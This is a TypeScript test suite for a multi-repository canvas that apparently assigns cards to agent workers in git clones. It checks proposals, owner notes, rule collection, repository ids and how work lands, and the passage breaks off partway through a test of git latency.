import { afterEach, beforeEach, describe, expect, test } from 'bun:test';
import { existsSync, mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { boundsOf, CARD_SIZE } from '../core/layout';
import type { CardAction } from '../core/types';
import type { RepoConfig, RepoSettings } from '../core/config';
import type { StoredContribution } from './row';
import { CanvasRuntime } from './canvas';
import { Canvases, startCanvases } from './canvases';
import { Store } from './db';
import { readShared } from '../adapters';
import { commandsOf } from './trust';
import { artifact, commit, FakeRuntime, gitClone, gitRepo, heard, identify, noForge, refusal, removeDir, syncGitCalls, until } from './testing';
import { HERE } from './workspaces';
import { git } from './git';
import { type SkillPlace, Skills } from './skills';
import { OBEYA_PLUGIN } from './demo';
import { STALL_MS } from './stalls';

let dir: string;
let runtime: FakeRuntime;
let canvas: CanvasRuntime;
let store: Store;

/** A repository with one plan doc (same path in both). */
function repo(name: string, title: string) {
  return gitRepo(join(dir, name), { 'docs/plan/plan.md': `# ${title}\n\n## Goal\n\nG.\n\n## Workstreams\n\n- [ ] **W1:** Erster Schritt.\n` });
}

/** The canvases and sets of them the test started: each is shut down after it. */
const running = new Set<CanvasRuntime | Canvases>();
const track = <T extends CanvasRuntime | Canvases>(c: T) => (running.add(c), c);
const start = async (...args: Parameters<typeof CanvasRuntime.start>) => track(await CanvasRuntime.start(...args));
const startSet = async (...args: Parameters<typeof Canvases.start>) => track(await Canvases.start(...args));
/** Shuts `c` down (Obeya stopping) and waits for git freeing its workspaces, so their directory can go. */
async function stop(c: CanvasRuntime | Canvases) {
  running.delete(c);
  c.shutdown();
  await Promise.all((c instanceof Canvases ? c.all() : [c]).flatMap((x) => x.repos).map((r) => r.workers.freed()));
}
const stopAll = () => Promise.all([...running].map(stop));

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'obeya-canvas-'));
  runtime = new FakeRuntime();
});
afterEach(async () => {
  await stopAll();
  await removeDir(dir);
});

/** The canvas "Produkt" on the repositories web, its home, and api, with a plan doc each. */
async function produkt() {
  const web = repo('web', 'Web');
  const api = repo('api', 'API');
  canvas = await start(
    { name: 'Produkt', repos: [{ path: web, clones: 1, settings: { land: 'pr' } }, { path: api, clones: 1, settings: { land: 'pr' } }] },
    { store: (store = new Store(':memory:')), home: dir, runtime, forge: noForge },
  );
}

// the timers' work done, and the workers it started at work in their workspaces
const settle = async () => {
  await new Promise((r) => setTimeout(r, 5));
  await Promise.all(canvas.repos.map((r) => r.workers.prepared()));
};
/** Collects what goes to `console.error` until `restore`. */
function quiet() {
  const lines: string[] = [];
  const error = console.error;
  console.error = (line: string) => lines.push(line);
  return { lines, restore: () => (console.error = error) };
}
const item = (id: string) => canvas.board.item(id)!;
/** Why the canvas refuses the owner's action on the card, if it does. */
const refused = (cardId: string, a: CardAction) => refusal(() => canvas.act(cardId, a));

describe('a canvas with several repositories', () => {
  beforeEach(produkt);

  test('names itself, lists its repositories, and shows the plan docs of all of them', () => {
    expect(canvas.board.canvas).toMatchObject({ id: 'produkt', name: 'Produkt', repos: [{ id: 'web' }, { id: 'api' }] });
    const projects = canvas.board.snapshot().items.filter((i) => i.kind === 'project');
    expect(projects.map((p) => [p.title, p.repo, p.plan!.file]).sort()).toEqual([
      ['API', 'api', 'api:docs/plan/plan.md'],
      ['Web', 'web', 'docs/plan/plan.md'],
    ]);
    const ws = canvas.board.snapshot().items.filter((i) => i.label === 'W1');
    expect(ws.map((w) => w.repo).sort()).toEqual(['api', 'web']);
  });

  test('a repository whose settings share no demos offers no sharing', () => {
    expect(canvas.board.canvas.repos.map((r) => r.share)).toEqual([undefined, undefined]);
    const c = canvas.board.create({ title: 'Home', x: 0, y: 0 });
    canvas.board.work(c.id, { state: 'live', demo: JSON.stringify({ kind: 'video', dir, chapters: [] }) });
    expect(() => canvas.act(c.id, { action: 'share' })).toThrow('shares none');
    expect(() => canvas.act(c.id, { action: 'unshare' })).toThrow('not shared');
  });


  test("a card works in its repository's clone", async () => {
    const home = canvas.board.create({ title: 'Home', x: 0, y: 0 });
    const other = canvas.board.create({ title: 'Andere', x: 0, y: 0, repo: 'api' });
    expect([home.repo, other.repo]).toEqual(['web', 'api']);
    await canvas.repoOf(other.id).workers.start(other.id);
    await canvas.repoOf(home.id).workers.start(home.id);
    expect(canvas.board.row(other.id).workspace).toBe(join(dir, 'workspaces/produkt/api/1'));
    expect(canvas.board.row(home.id).workspace).toBe(join(dir, 'workspaces/produkt/1'));
    expect(() => canvas.board.create({ title: 'X', x: 0, y: 0, repo: 'nope' })).toThrow();
  });

  test("an archived card's diff is what its landing put on its repository's main", async () => {
    const api = join(dir, 'api');
    const base = git(api, 'rev-parse', 'HEAD').trim();
    const head = commit(api, 'export.ts', 'export {}\n', 'Export');
    const c = canvas.board.create({ title: 'Export', x: 0, y: 0, repo: 'api' });
    canvas.board.work(c.id, { state: 'live', shipped: JSON.stringify({ base, commit: head }) });
    canvas.board.archive([c.id]);
    expect(canvas.board.item(c.id)).toBeUndefined();
    expect(await canvas.diff(c.id, false)).toMatchObject({ source: 'landed', files: [{ file: 'export.ts', status: 'added', added: 1, removed: 0 }] });
  });

  test("the snapshot counts each repository's clones by machine, the cards that hold one and those at work, and lists each clone with its card", async () => {
    const here = (cards: string[], busy: string[]) => ({
      hosts: [{ name: HERE, here: true, slots: 1, total: 1, cards, busy, workspaces: [{ path: expect.any(String), ...(cards[0] ? { card: cards[0], title: 'Andere', takeable: true as const } : {}) }] }],
    });
    expect(canvas.board.snapshot().workspaces).toEqual([
      { repo: 'web', ...here([], []) },
      { repo: 'api', ...here([], []) },
    ]);
    const other = canvas.board.create({ title: 'Andere', x: 0, y: 0, repo: 'api' });
    await canvas.repoOf(other.id).workers.start(other.id);
    expect(canvas.board.snapshot().workspaces).toEqual([
      { repo: 'web', ...here([], []) },
      { repo: 'api', ...here([other.id], [other.id]) },
    ]);
    await canvas.repoOf(other.id).workers.stop(other.id);
    expect(canvas.board.snapshot().workspaces![1]).toEqual({ repo: 'api', ...here([], []) });
  });

  test("a stopped workstream of a repository after the first keeps its clone when Obeya starts again", async () => {
    await stop(canvas);
    const config = { name: 'Produkt', repos: [{ path: join(dir, 'web'), clones: 1, settings: { land: 'main' as const } }, { path: join(dir, 'api'), clones: 1, settings: { land: 'main' as const } }] };
    // watching the first repository reads the docs before the second one is on the canvas
    const open = () => start(config, { store, home: dir, runtime, forge: noForge, watch: true });
    canvas = await open();
    const w = canvas.board.snapshot().items.find((i) => i.label === 'W1' && i.repo === 'api')!;
    await canvas.repoOf(w.id).workers.start(w.id);
    const clone = canvas.board.row(w.id).workspace!;
    commit(clone, 'x.ts', 'export {}\n', 'X');
    await canvas.repoOf(w.id).workers.stop(w.id);
    await stop(canvas);
    canvas = await open();
    expect(canvas.repoOf(w.id).workspaces.leasedBy(w.id)).toBe(clone);
    expect(canvas.board.row(w.id).workspace).toBe(clone);
  });

  test('cards of different repositories never wait for each other', async () => {
    const a = canvas.board.create({ title: 'A', x: 0, y: 0 });
    canvas.act(a.id, { action: 'start' });
    await settle();
    expect(item(a.id).state).toBe('working');
    // A's estimate, and B in the other repository with the same file
    const estimate = () => runtime.withTool('scope').at(-1)!;
    const scopeCall = (files: string[], conflicts: string[] = []) => {
      const s = estimate();
      s.call('scope', { files, conflicts_with: conflicts, reason: '' });
      s.emit({ type: 'idle' });
    };
    scopeCall(['src/index.ts']);
    await settle();
    const b = canvas.board.create({ title: 'B', x: 0, y: 0, repo: 'api' });
    canvas.act(b.id, { action: 'start' });
    await settle();
    // nothing in progress in "api": B starts without an estimate first
    expect(item(b.id).state).toBe('working');
    // and a second card in "web" is judged against A only, and waits for it
    const c = canvas.board.create({ title: 'C', x: 0, y: 0 });
    canvas.act(c.id, { action: 'start' });
    await settle();
    scopeCall(['src/index.ts']);
    // C's estimate, once git has read what A changed
    await until(() => estimate().inbox[0]!.includes('task "C"'));
    expect(estimate().inbox[0]).toContain(`K${a.number}: "A"`);
    expect(estimate().inbox[0]).not.toContain('"B"');
    scopeCall(['src/index.ts'], [`K${a.number}`]);
    await settle();
    expect(item(c.id).queue).toMatchObject({ behind: [a.id] });
  });

  test('accepting a proposal starts it', async () => {
    const b = canvas.board.create({ title: 'B', x: 0, y: 0 });
    const p = canvas.board.propose(b.id, { title: 'Folgefehler', task: 'S', reason: 'R' });
    canvas.act(p.id, { action: 'accept' });
    expect(item(p.id)).toMatchObject({ state: 'planned', queue: { checking: true } });
    await settle();
    expect(item(p.id).state).toBe('working');
    expect(() => canvas.act(p.id, { action: 'accept' })).toThrow();
  });

  test('a note typed while Obeya checks the card waits for its worker and goes with the task', async () => {
    const b = canvas.board.create({ title: 'B', x: 0, y: 0 });
    const p = canvas.board.propose(b.id, { title: 'Folgefehler', task: 'S', reason: 'R' });
    canvas.act(p.id, { action: 'accept' });
    expect(item(p.id).queue).toMatchObject({ checking: true });
    canvas.tell(p.id, 'Auch die alten Karten nachtragen.', [], false);
    expect(canvas.board.events(p.id).at(-1)).toMatchObject({ kind: 'hint', author: 'owner', text: 'Auch die alten Karten nachtragen.', unread: true });
    await settle();
    expect(item(p.id).state).toBe('working');
    const worker = runtime.sessions.find((s) => s.spec.role === 'worker')!;
    expect(worker.inbox[0]).toContain('A note the owner left on the card while no agent worked on it:\n\nAuch die alten Karten nachtragen.');
    expect(canvas.board.events(p.id).find((e) => e.text === 'Auch die alten Karten nachtragen.')!.unread).toBeUndefined();
  });

  test('notes left on a planned card before anyone starts it go with the task to its worker', async () => {
    const card = canvas.board.create({ title: 'Export', x: 0, y: 0, body: 'CSV-Export für Rechnungen.' });
    canvas.tell(card.id, 'Achte auf Umlaute in den Spaltennamen.', [], false);
    canvas.tell(card.id, 'Und auf das Datumsformat.', [], true);
    expect(item(card.id).state).toBe('planned');
    expect(canvas.board.events(card.id).filter((e) => e.author === 'owner').map((e) => [e.text, e.unread])).toEqual([
      ['Achte auf Umlaute in den Spaltennamen.', true],
      ['Und auf das Datumsformat.', true],
    ]);
    expect(runtime.sessions.filter((s) => s.spec.role === 'worker')).toHaveLength(0);
    canvas.act(card.id, { action: 'start' });
    await settle();
    expect(item(card.id).state).toBe('working');
    const worker = runtime.sessions.find((s) => s.spec.role === 'worker')!;
    expect(worker.inbox).toHaveLength(1);
    expect(worker.inbox[0]).toContain('CSV-Export für Rechnungen.');
    expect(worker.inbox[0]).toContain('A note the owner left on the card while no agent worked on it:\n\nAchte auf Umlaute in den Spaltennamen.');
    expect(worker.inbox[0]).toMatch(/A note the owner left on the card while no agent worked on it \(.*\):\n\nUnd auf das Datumsformat\./);
    expect(canvas.board.events(card.id).filter((e) => e.author === 'owner' && e.unread)).toHaveLength(0);
  });

  test('notes left on a planned card that becomes an idea open its discussion', () => {
    const card = canvas.board.create({ title: 'Export', x: 0, y: 0, body: 'CSV-Export für Rechnungen.' });
    canvas.tell(card.id, 'Vielleicht reicht auch Excel.', [], false);
    canvas.patch(card.id, { state: 'idea' });
    const s = runtime.withTool('update_brief').at(-1)!;
    expect(s.inbox[0]).toContain('left the notes below on it');
    expect(s.inbox[0]).toContain('Vielleicht reicht auch Excel.');
    expect(canvas.board.events(card.id).find((e) => e.text === 'Vielleicht reicht auch Excel.')!.unread).toBeUndefined();
    expect(canvas.board.row(card.id).unheard).toBeNull();
  });

  test("the options picked on a proposal go into its text as decided, the others as open", () => {
    const b = canvas.board.create({ title: 'B', x: 0, y: 0 });
    const questions = [
      { text: 'Welches Wort?', options: ['Erledigt', 'Beendet'] },
      { text: 'Auch im Archiv?', options: ['Ja', 'Nein'] },
      { text: 'Was noch?', options: [] },
    ];
    const p = canvas.board.propose(b.id, { title: 'Ein Wort', task: 'Zustand und Knopf angleichen.', reason: 'R', questions });
    canvas.act(p.id, { action: 'accept', start: false, picks: [['Beendet'], [], ['erfunden']] });
    expect(item(p.id).body).toBe('Zustand und Knopf angleichen.\n\nEntschieden:\n- Welches Wort? → Beendet\n\nOffene Fragen:\n- Auch im Archiv? (Ja / Nein)\n- Was noch?');
  });

  test('a proposed idea becomes an idea whose agent opens the discussion; taken as a task it is planned', () => {
    const b = canvas.board.create({ title: 'B', x: 0, y: 0 });
    const p = canvas.board.propose(b.id, { title: 'Vorschläge mit Fragen', task: 'Vorschläge könnten Fragen tragen.', reason: 'R', idea: true });
    expect(item(p.id).proposal).toEqual({ idea: true, reason: 'R', questions: [] });
    canvas.act(p.id, { action: 'accept' });
    expect(item(p.id)).toMatchObject({ state: 'idea', idea: { status: 'open', thinking: true } });
    const s = runtime.withTool('update_brief').at(-1)!;
    expect(s.inbox[0]).toContain('A worker proposed this idea');
    const q = canvas.board.propose(b.id, { title: 'Noch eine', task: 'T', reason: 'R', idea: true });
    canvas.act(q.id, { action: 'accept', start: false });
    expect(item(q.id).state).toBe('planned');
  });

  test('a proposed task taken as an idea opens its discussion, with the options picked on it as decided', () => {
    const b = canvas.board.create({ title: 'B', x: 0, y: 0 });
    const p = canvas.board.propose(b.id, { title: 'Export', task: 'Exporte als PDF.', reason: 'R', questions: [{ text: 'Auch CSV?', options: ['Ja', 'Nein'] }] });
    canvas.act(p.id, { action: 'accept', start: false, idea: true, picks: [['Ja']] });
    expect(item(p.id)).toMatchObject({ state: 'idea', body: 'Exporte als PDF.\n\nEntschieden:\n- Auch CSV? → Ja', idea: { status: 'open', thinking: true } });
    expect(item(p.id).queue).toBeFalsy();
    const s = runtime.withTool('update_brief').at(-1)!;
    expect(s.inbox[0]).toContain('A worker proposed this as a task to build');
  });

  test("the work retrospective's proposals are accepted like an agent's, also one stored without proposal data", () => {
    const p = canvas.board.proposeRetro('web', { title: 'Skript für Starts', body: 'Ein Skript, das den Server startet.', basis: 'Starts dauern.' });
    expect(item(p.id).proposal).toEqual({ questions: [] });
    canvas.act(p.id, { action: 'accept' });
    expect(item(p.id).state).toBe('planned');
    // as the work retrospective made them before
    const q = canvas.board.proposeRetro('web', { title: 'Skill für Demos', body: 'Ein Skill.', basis: 'Demos scheitern.' });
    store.update(q.id, { proposal: null });
    canvas.act(q.id, { action: 'accept', start: false });
    expect(item(q.id).state).toBe('planned');
    const r = canvas.board.proposeRetro('web', { title: 'Regel für Tests', body: 'Eine Regel.', basis: 'Tests fehlen.' });
    store.update(r.id, { proposal: null });
    canvas.act(r.id, { action: 'accept', idea: true });
    expect(item(r.id).state).toBe('idea');
  });

  test('a proposal from a workstream goes to a free spot beside its project, not onto it', () => {
    const items = canvas.board.snapshot().items;
    const project = items.find((i) => i.kind === 'project' && i.repo === 'web')!;
    const ws = items.find((i) => i.parent === project.id)!;
    const p = canvas.board.propose(ws.id, { title: 'Folgefehler', task: 'S', reason: 'R' });
    const all = canvas.board.snapshot().items;
    const pb = boundsOf(item(p.id), all);
    for (const o of all.filter((i) => !i.parent && i.id !== p.id).map((i) => boundsOf(i, all)))
      expect(pb.x + pb.w <= o.x || o.x + o.w <= pb.x || pb.y + pb.h <= o.y || o.y + o.h <= pb.y).toBe(true);
    // a second one does not land on the first
    const q = canvas.board.propose(ws.id, { title: 'Noch einer', task: 'S', reason: 'R' });
    expect([item(q.id).x, item(q.id).y]).not.toEqual([item(p.id).x, item(p.id).y]);
  });

  test('a proposal can be edited, and accepted without starting', async () => {
    const b = canvas.board.create({ title: 'B', x: 0, y: 0 });
    const p = canvas.board.propose(b.id, { title: 'Folgefehler', task: 'S', reason: 'R' });
    canvas.board.patch(p.id, { title: 'Folgefehler im Export', body: 'Nur den Export.' });
    canvas.act(p.id, { action: 'accept', start: false });
    await settle();
    expect(item(p.id)).toMatchObject({ state: 'planned', title: 'Folgefehler im Export', body: 'Nur den Export.', kind: 'task' });
    expect(item(p.id).queue).toBeFalsy();
  });

  test('rules for a CLAUDE.md collect in one card per repository, which start once no rule proposal waits', async () => {
    const b = canvas.board;
    const web = b.proposePreference('Tests auf Deutsch.', {}, undefined, 'web');
    const api = b.proposePreference('Logs auf Englisch.', {}, undefined, 'api');
    const both = b.proposePreference('Keine any-Typen.', {}, undefined, 'web');
    const obeya = b.proposePreference('Fragen mit höchstens drei Optionen.', {});
    canvas.acceptRule(web);
    // the owner moves it from api to web
    canvas.acceptRule(api, undefined, 'web');
    canvas.acceptRule(both);
    const collect = b.collecting('web')!;
    expect(collect).toMatchObject({ repo: 'web', title: 'CLAUDE.md ergänzen' });
    expect(collect.body).toEndWith('- Tests auf Deutsch.\n- Logs auf Englisch.\n- Keine any-Typen.');
    expect(collect.queue).toBeFalsy();
    expect(b.collecting('api')).toBeUndefined();
    // the last open proposal is decided: the card goes to the Coordinator like a started one
    canvas.rejectRule(obeya);
    expect(item(collect.id).queue).toMatchObject({ checking: true });
    await settle();
    expect(item(collect.id).state).toBe('working');
    expect(b.preferencesText()).toBe('');
  });

  test('proposals keep the repository of the card they came from', () => {
    const b = canvas.board.create({ title: 'B', x: 0, y: 0, repo: 'api' });
    const p = canvas.board.propose(b.id, { title: 'Folgefehler', task: 'S', reason: 'R' });
    expect(p.repo).toBe('api');
  });
});

test('the home repository stays home when the configuration lists the repositories in another order', async () => {
  const store = new Store(':memory:');
  const web = repo('web', 'Web');
  const api = repo('api', 'API');
  const deps = { store, home: dir, runtime: new FakeRuntime(), forge: noForge };
  const first = await start({ name: 'P', repos: [{ path: web }, { path: api }] }, deps);
  const card = first.board.create({ title: 'Home-Karte', x: 0, y: 0 });
  await stop(first);
  const again = await start({ name: 'P', repos: [{ path: api }, { path: web }] }, deps);
  expect(again.board.canvas.repos.map((r) => r.id)).toEqual(['web', 'api']);
  expect(again.board.item(card.id)!.repo).toBe('web');
  await stop(again);
  expect(() => CanvasRuntime.start({ name: 'P', repos: [{ path: api }] }, deps)).toThrow('home repository "web" is not configured');
});

describe("a repository whose origin changes keeps its id and its cards", () => {
  /** The canvas "P" on web, its home, and the repository at `path`, its work landing on its main. */
  const config = (web: string, path: string) => ({ name: 'P', repos: [{ path: web }, { path, settings: { land: 'main' as const } }] });

  test('named after its directory before, after its new origin since: the id it was given stays', async () => {
    const store = new Store(':memory:');
    const web = repo('web', 'Web');
    const ui = repo('web-ui', 'UI');
    const deps = { store, home: dir, runtime: new FakeRuntime(), forge: noForge };
    const first = await start(config(web, ui), deps);
    expect(first.board.canvas.repos.map((r) => r.id)).toEqual(['web', 'web-ui']);
    const card = first.board.create({ title: 'UI-Karte', x: 0, y: 0, repo: 'web-ui' });
    await stop(first);
    git(ui, 'remote', 'add', 'origin', join(dir, 'frontend.git'));
    const again = await start(config(web, ui), deps);
    expect(again.board.canvas.repos.map((r) => [r.id, r.name])).toEqual([
      ['web', 'web'],
      ['web-ui', 'frontend'],
    ]);
    expect(again.board.item(card.id)!.repo).toBe('web-ui');
    expect(again.repos.map((r) => r.ref.id)).toContain('web-ui');
    await stop(again);
    // and once more, with yet another origin
    git(ui, 'remote', 'set-url', 'origin', join(dir, 'app.git'));
    const third = await start(config(web, ui), deps);
    expect(third.board.canvas.repos.map((r) => r.id)).toEqual(['web', 'web-ui']);
  });

  test("renamed before Obeya kept ids, it takes back its directory's name where its cards still have it", async () => {
    const store = new Store(':memory:');
    const web = repo('web', 'Web');
    const ui = repo('web-ui', 'UI');
    const deps = { store, home: dir, runtime: new FakeRuntime(), forge: noForge };
    const first = await start(config(web, ui), deps);
    const card = first.board.create({ title: 'UI-Karte', x: 0, y: 0, repo: 'web-ui' });
    await stop(first);
    // as a store from before ids were kept has it
    store.setSetting('p', 'repo_ids', '{}');
    git(ui, 'remote', 'add', 'origin', join(dir, 'frontend.git'));
    const again = await start(config(web, ui), deps);
    expect(again.board.canvas.repos.map((r) => r.id)).toEqual(['web', 'web-ui']);
    expect(again.board.item(card.id)!.repo).toBe('web-ui');
    await stop(again);
    // its plan doc's cards are enough, with no other card on it
    store.update(card.id, { repo: 'web' });
    store.setSetting('p', 'repo_ids', '{}');
    const planned = await start(config(web, ui), deps);
    expect(planned.board.canvas.repos.map((r) => r.id)).toEqual(['web', 'web-ui']);
    expect(planned.board.snapshot().items.some((i) => i.repo === 'web-ui' && i.label === 'W1')).toBe(true);
    await stop(planned);
    // without such cards, it is named after its origin
    const other = new Store(':memory:');
    const fresh = await start(config(web, ui), { ...deps, store: other });
    expect(fresh.board.canvas.repos.map((r) => r.id)).toEqual(['web', 'frontend']);
  });

  test('a repository new on the canvas whose name another one has gets a number, whatever the order', async () => {
    const store = new Store(':memory:');
    const web = repo('web', 'Web');
    const a = repo('a', 'A');
    const b = repo('b', 'B');
    git(a, 'remote', 'add', 'origin', join(dir, 'shop.git'));
    const deps = { store, home: dir, runtime: new FakeRuntime(), forge: noForge };
    const first = await start({ name: 'P', repos: [{ path: web }, { path: a, settings: { land: 'main' as const } }] }, deps);
    expect(first.board.canvas.repos.map((r) => r.id)).toEqual(['web', 'shop']);
    await stop(first);
    git(b, 'remote', 'add', 'origin', join(dir, 'other/shop.git'));
    const again = await start({ name: 'P', repos: [{ path: web }, { path: b, settings: { land: 'main' as const } }, { path: a, settings: { land: 'main' as const } }] }, deps);
    expect(again.board.canvas.repos.map((r) => [r.id, r.path])).toEqual([
      ['web', web],
      ['shop2', b],
      ['shop', a],
    ]);
  });
});

test('canvases start, take a new configuration and restart a repository without the server waiting for git', async () => {
  const web = repo('web', 'Web');
  // a repository with an origin on a server (named after it), its read tree a worktree, clones to make and one listed
  const upstream = repo('shop.git', 'Shop');
  const shop = join(dir, 'shop');
  gitClone(upstream, shop);
  git(shop, 'config', 'url.' + upstream + '.insteadOf', 'https://github.com/acme/shop.git');
  git(shop, 'remote', 'set-url', 'origin', 'https://github.com/acme/shop.git');
  const listed = join(dir, 'shop-listed');
  gitClone(upstream, listed);
  const docs = repo('docs', 'Docs');
  const api = repo('api', 'API');
  const shopConfig = (clones: number) => ({ path: shop, clones, workspaces: [listed], settings: { land: 'pr' as const } });
  const synced = syncGitCalls();
  const set = await startSet(
    [
      { name: 'Produkt', repos: [{ path: web }, shopConfig(1)] },
      { name: 'Docs', repos: [{ path: docs }] },
    ],
    { store: new Store(':memory:'), home: dir, runtime: new FakeRuntime(), forge: noForge, restartIntervalMs: 5 },
  );
  const produkt = set.get('produkt')!;
  const shopRef = () => produkt.board.canvas.repos.find((r) => r.id === 'shop')!;
  expect(shopRef().forge).toBe(true);
  expect(produkt.repos[1]!.read.path).toBe(join(dir, 'read', 'produkt', 'shop'));
  expect(existsSync(join(dir, 'read', 'produkt', 'shop', 'docs/plan/plan.md'))).toBe(true);
  expect(produkt.repos[1]!.workspaces.list()).toHaveLength(2);
  // a repository new on a canvas, and one whose clones changed, which restarts once its agents paused
  const before = produkt.repos[1]!;
  await set.apply(
    [
      { name: 'Produkt', repos: [{ path: web }, shopConfig(2)] },
      { name: 'Docs', repos: [{ path: docs }, { path: api }] },
    ],
    ['produkt', 'docs'],
  );
  await until(() => produkt.repos[1] !== before);
  await until(() => produkt.repos[1]!.workspaces.list().length === 3);
  expect(set.get('docs')!.board.canvas.repos.map((r) => r.id)).toEqual(['docs', 'api']);
  expect(synced.stop()).toEqual([]);
});

test('a canvas starting with a workstream whose work landed while its box stays open plans it again without the server waiting for git', async () => {
  await produkt();
  const web = join(dir, 'web');
  const w1 = canvas.board.snapshot().items.find((i) => i.label === 'W1' && i.repo === 'web')!;
  await stop(canvas);
  // its work on main, which the read tree (a worktree, for work that goes out as pull requests) is on
  identify(web);
  const head = commit(web, 'export.ts', 'export {}\n', 'Export');
  store.update(w1.id, { state: 'live', shipped: JSON.stringify({ commit: head }) });
  const synced = syncGitCalls();
  canvas = await start(
    { name: 'Produkt', repos: [{ path: web, clones: 1, settings: { land: 'pr' } }, { path: join(dir, 'api'), clones: 1, settings: { land: 'pr' } }] },
    { store, home: dir, runtime, forge: noForge },
  );
  await until(() => item(w1.id).state === 'planned');
  expect(item(w1.id).landedPart).toEqual({ commit: expect.any(String) });
  expect(synced.stop()).toEqual([]);
});

test('a repository whose clones cannot be made does not run: another one leaves its canvas, the home one keeps the canvas from starting', async () => {
  const web = repo('web', 'Web');
  const shop = repo('shop', 'Shop');
  // its origin is gone (and names it): the clones of work that goes out as pull requests come from there
  git(shop, 'remote', 'add', 'origin', join(dir, 'gone.git'));
  const errors = quiet();
  const set = await startSet(
    [
      { name: 'Web', repos: [{ path: web }, { path: shop, clones: 1, settings: { land: 'pr' } }] },
      { name: 'Shop', repos: [{ path: shop, clones: 1, settings: { land: 'pr' } }] },
    ],
    { store: new Store(':memory:'), home: dir, runtime: new FakeRuntime(), forge: noForge },
  );
  errors.restore();
  expect(set.all().map((c) => c.id)).toEqual(['web']);
  expect(set.get('web')!.board.canvas.repos.map((r) => r.id)).toEqual(['web']);
  expect(set.failures()).toEqual([
    { canvas: 'shop', detail: expect.stringContaining('git clone') },
    { canvas: 'web', repo: 'gone', detail: expect.stringContaining('git clone') },
  ]);
  expect(errors.lines.join('\n')).toContain('its clones cannot be made');
});

test("a canvas without a name is named after its repository; a canvas that does not start leaves the others running", async () => {
  const store = new Store(':memory:');
  const deps = { store, home: dir, runtime: new FakeRuntime(), forge: noForge };
  const shop = gitRepo(join(dir, 'shop'), { 'docs/plan/plan.md': '# Laden\n\n## Goal\n\nG.\n' });
  const web = repo('web', 'Web');
  const errors = quiet();
  const started = (await startCanvases([{ repos: [{ path: shop }] }, { name: 'Weg', repos: [{ path: join(dir, 'nowhere') }] }, { name: 'Web', repos: [{ path: web }] }], deps).finally(errors.restore)).map(track);
  expect(started.map((c) => [c.id, c.board.canvas.name])).toEqual([
    ['shop', 'shop'],
    ['web', 'Web'],
  ]);
  expect(errors.lines).toEqual([expect.stringMatching(/^Obeya: the canvas Weg does not start, left out: .*nowhere is not a git repository$/)]);
});

test("the cards' workers run on their own runtime when one is given (a scratch Obeya's idle workers)", async () => {
  const web = repo('web', 'Web');
  const workers = new FakeRuntime();
  canvas = await start({ repos: [{ path: web, clones: 1 }] }, { store: new Store(':memory:'), home: dir, runtime, workerRuntime: workers, forge: noForge });
  const a = canvas.board.create({ title: 'A', x: 0, y: 0 });
  canvas.act(a.id, { action: 'start' });
  await settle();
  expect(item(a.id).state).toBe('working');
  expect(workers.sessions.map((s) => s.spec.cwd)).toEqual([canvas.board.row(a.id).workspace!]);
  expect(runtime.sessions.some((s) => s.spec.cwd === canvas.board.row(a.id).workspace)).toBe(false);
});

describe('where the settings do not say how work lands', () => {
  test('a repository without a remote gets its approved work on its main branch', async () => {
    const shop = gitRepo(join(dir, 'shop'));
    git(shop, 'branch', '-m', 'master');
    const workers = new FakeRuntime();
    canvas = await start({ repos: [{ path: shop, clones: 1 }] }, { store: new Store(':memory:'), home: dir, runtime, workerRuntime: workers, forge: noForge });
    expect(canvas.repos[0]!.adapter.land).toBe('main');
    expect(canvas.board.snapshot().canvas.repos[0]!.pullRequests).toBeUndefined();
    const card = canvas.board.create({ title: 'Readme', x: 0, y: 0 });
    await canvas.repos[0]!.workers.start(card.id);
    const ws = canvas.board.row(card.id).workspace!;
    identify(ws);
    writeFileSync(join(ws, 'README.md'), 'Shop\n');
    git(ws, 'commit', '--quiet', '-am', 'Readme');
    await workers.last.call('ready_for_review', { summary: 'Readme', demo: artifact() });
    workers.last.emit({ type: 'idle' });
    await canvas.repos[0]!.workers.approve(card.id);
    expect(item(card.id).state).toBe('live');
    expect(git(shop, 'log', '-1', '--format=%s', 'master').trim()).toBe('Readme');
    expect(workers.last.inbox.at(-1)).not.toContain('pull request');
  });

  test('a repository whose origin is on GitHub goes on through pull requests', async () => {
    const shop = gitRepo(join(dir, 'shop'));
    git(shop, 'remote', 'add', 'origin', 'git@github.com:acme/shop.git');
    canvas = await start({ repos: [{ path: shop }] }, { store: new Store(':memory:'), home: dir, runtime, forge: noForge });
    expect(canvas.repos[0]!.adapter.land).toBe('pr');
    expect(canvas.board.snapshot().canvas.repos[0]!.pullRequests).toBe(true);
  });
});

describe('many landings and agent starts at once', () => {
  test("the server waits for git in none of them, however slow git is: no stall", async () => {
    const shop = gitRepo(join(dir, 'shop'), { 'README.md': 'Shop\n', '.obeya/settings.json': '{ "land": "main" }\n', '.claude/settings.json': '{}\n' });
    identify(shop);
    const workers = new FakeRuntime();
    canvas = await start({ repos: [{ path: shop }] }, { store: new Store(':memory:'), home: dir, runtime, workerRuntime: workers, forge: noForge });
    const w = canvas.repos[0]!.workers;
    const cards = ['A', 'B', 'C', 'D', 'E', 'F'].map((title) => canvas.board.create({ title, x: 0, y: 0 }));
    const sessionOf = (id: string) => workers.sessions.find((s) => s.spec.cwd === canvas.board.row(id).workspace);
    // four handed over, each with a commit of its own
    for (const c of cards.slice(0, 4)) {
      await w.start(c.id);
      await until(() => !!sessionOf(c.id));
      const ws = canvas.board.row(c.id).workspace!;
      commit(ws, `${c.title}.md`, `${c.title}\n`, c.title);
      await sessionOf(c.id)!.call('ready_for_review', { summary: c.title, demo: artifact() });
      sessionOf(c.id)!.emit({ type: 'idle' });
    }
    // git as slow as on a busy machine: each process the server waited for would hold it up that long
    const waited: string[] = [];
    const spawnSync = Bun.spawnSync;
    Bun.spawnSync = ((...args: Parameters<typeof Bun.spawnSync>) => {
      waited.push((args[0] as string[]).join(' '));
      Bun.sleepSync(150);
      return spawnSync(...args);
    }) as typeof Bun.spawnSync;
    let stall = 0;
    let last = performance.now();
    const ticks = setInterval(() => {
      const now = performance.now();
      stall = Math.max(stall, now - last);
      last = now;
    }, 5);
    try {
      // all four approved at once, their work landing on main one after the other, and two cards starting meanwhile
      await Promise.all([...cards.slice(0, 4).map((c) => w.approve(c.id)), ...cards.slice(4).map((c) => w.start(c.id))]);
      // each start reads the default branch's settings with git first: on a busy CI runner that took over three seconds
      await until(() => cards.slice(4).every((c) => sessionOf(c.id)), 20_000);
    } finally {
      clearInterval(ticks);
      Bun.spawnSync = spawnSync;
    }
